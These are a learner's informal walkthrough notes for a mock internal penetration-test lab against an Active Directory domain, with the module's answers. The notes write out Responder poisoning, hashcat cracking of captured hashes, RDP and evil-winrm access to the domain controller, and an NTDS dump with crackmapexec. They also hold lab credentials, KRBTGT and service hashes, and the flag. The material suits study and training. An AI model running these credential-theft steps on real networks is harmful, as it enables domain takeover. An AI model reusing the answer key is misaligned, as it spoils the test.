You are an assessor for Acme Security, Ltd. Your team has been hired to perform an internal penetration test against one of Inlanefreight's internal networks. The tester assigned to the project had to go out on leave unexpectedly, so you have been tasked by your manager with taking over the assessment. You've had limited communication with the tester, and all of their notes are left on the testing VM configured within the internal network. The scope provided by the client is as follows:

Network range: 172.16.5.0/24
Domain: INLANEFREIGHT.LOCAL
Your teammate has already created a directory structure and detailed Obsidian notebook to record their testing activities. They made a list of 13 findings but only recorded evidence for a few of them. Step in as the penetration tester and complete this mock engagement to the best of your abilities. Experiment with the following to refine your skills:

Set up Tmux logging and record all of your evidence using Tmux while getting more comfortable with the tool

Enumerate and exploit all 13 findings listed and gather evidence for the findings that don't have any evidence recorded in the notebook

Keep a detailed log of all activities you perform

Update the payload log as needed

Log all scan and tool output generated while performing enumeration and gathering additional finding evidence

Practice writing up the findings using either WriteHat or the provided reporting template, or practice with both.

Finish the penetration test and complete the questions below to conclude this module.


okay so im gonna kinda list what we have so far then keep it moving and then piece together notes and steps 


1. so we have dhawkins creds from ASREPRoasting -> dhawkins:Bacon1989
2. we see that responder was able to get some responses we can dive deeper in a minute and try to get more 172.16.5.5 
3. tomcat creds -> tomcat:admin 
4. admin password reuse -> HOST = FILE01 (172.16.5.130) \ administrator:Welcome123! -> HOST DEV01 (172.16.5.200) \ administrator:Welcome123!
5. Password in description field -> note left blank 
6. used metasploit to get IPMI hash -> 172.16.5.127 -> ADMIN:5768797002000000e05179a2382122e7500df7c9949a89f08a1987132dd0f48fe2e1d37238c7448fa123456789abcdefa123456789abcdef140541444d494e:a60c216003306640422c8855b290c32c53319e5a
7. Two hits on AD passwords -> abouldercron & asmith both have passwords of Welcome1 on 172.16.5.5 
8. local file inclusion -> note left blank 
9. command injection -> note left blank 
10. directory listing enabled and exposing files -> 172.16.5.127/files 


starting where we left off on 2. lets re run responder -> sudo responder -I ens224 -wrvd -> output: backupagent::INLANEFREIGHT:d1cd8dfe7ddcb243:3914D20161AD8E739FF05DB65278C3E6:01010000000000000033B3EE9792DB019BF2FEEF99AB1B680000000002000800450039005A00420001001E00570049004E002D005A003200460046004400330052004E0035005000320004003400570049004E002D005A003200460046004400330052004E003500500032002E00450039005A0042002E004C004F00430041004C0003001400450039005A0042002E004C004F00430041004C0005001400450039005A0042002E004C004F00430041004C00070008000033B3EE9792DB01060004000200000008003000300000000000000000000000003000000B536BD2121D5284C8B4D9A60FA30377E63F2EE2B3F7A038436B567316047A660A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000

lets take it to our host machine and crack it -> hashcat -m 5600 backup.hash /usr/share/wordlists/rockyou.txt -> 

Output: BACKUPAGENT::INLANEFREIGHT:d1cd8dfe7ddcb243:3914d20161ad8e739ff05db65278c3e6:010100000000000<snipped>0035000000000000000000:Recovery7

so we have backupagent:Recovery7 

lets use this and rdp into the DC  -> FROM FIRST RDP'D session -> xfreerdp /v:172.16.5.5 /u:backupagent /p:Recovery7 

Once connected get to file explorer and go to C:\Users\Administrator\Desktop ( if it says you dont have permission just click yes to permiss or whatever) once there get flag.txt -L>
d0c_pwN_r3p0rt_reP3at!


now going back to the first RDP'd session lets get the admins hash -> 

sudo crackmapexec smb 172.16.5.5 -u backupagent -p Recovery7 --ntds
SMB         172.16.5.5      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)

SMB         172.16.5.5      445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...

<snipped> 


after going through these we have the hash of KRBTGT and the hash for svc_reporting so we can crack the hash for svc_reporting 

KRBTGT:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::

svc_reporting:7608:aad3b435b51404eeaad3b435b51404ee:a6d3701ae426329951cf5214b7531140::: 


hashcat -m 1000 'a6d3701ae426329951cf5214b7531140' /usr/share/wordlists/rockyou.txt -> a6d3701ae426329951cf5214b7531140:Reporter1! 



for our final question it asks to get the powerful group svc_reporting is apart of -> on OG RDP'd session ->  evil-winrm -i 172.16.5.5 -u backupagent -p Recovery7

output: 

Local Group Memberships      *Backup Operators
Global Group memberships     *Domain Users



CHALLENGE: 


Question 1 - Once you achieve Domain Admin level access, submit the contents of the flag.txt file on the Administrator Desktop on the DC01 host.
rdp into box they give us
once in, re run responder to get other hashes -> sudo responder -I ens224 -wrvd 
get backupagent hash and crack it with hashcat 
hashcat -m 5600 backup.hash /usr/share/wordlists/rockyou.txt -> cracked has of Recovery7 

from FIRST RDP session we are now going to RDP again into the DC -> xfreerdp /v:172.16.5.5 /u:backupagent /p:Recovery7 +
from here travel to file explorer and go to c:\Users\Administrator\Desktop\flag.txt  -> d0c_pwN_r3p0rt_reP3at! 

Question 2 - After achieving Domain Admin, submit the NTLM hash of the KRBTGT account.

back on the orginal RDP'd session run crackmapexec and gather all the hashes ->
sudo crackmapexec smb 172.16.5.5 -u backupagent -p Recovery7 --ntds > hashes.txt 
KRBTGT is one of the first to pop -> KRBTGT:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::

Question 3 - Dump the NTDS file and perform offline password cracking. Submit the password of the svc_reporting user as your answer.
from steps above... -> grep "svc_reporting" hashes.txt -> svc_reporting:7608:aad3b435b51404eeaad3b435b51404ee:a6d3701ae426329951cf5214b7531140::: 
lets crack latter part of hash -> a6d3701ae426329951cf5214b7531140
hashcat -m 1000 'a6d3701ae426329951cf5214b7531140' /usr/share/wordlists/rockyou.txt -> a6d3701ae426329951cf5214b7531140:Reporter1! 


Question 4 -  What powerful local group does this user belong to?
from OG RDP'd session we are going to use evil-winrm to enumerate the user -> 
evil-winrm -i 172.16.5.5 -u backupagent -p Recovery7
once connected run -> net user svc_reporting -> 
Local Group Memberships      *Backup Operators
Global Group memberships     *Domain Users
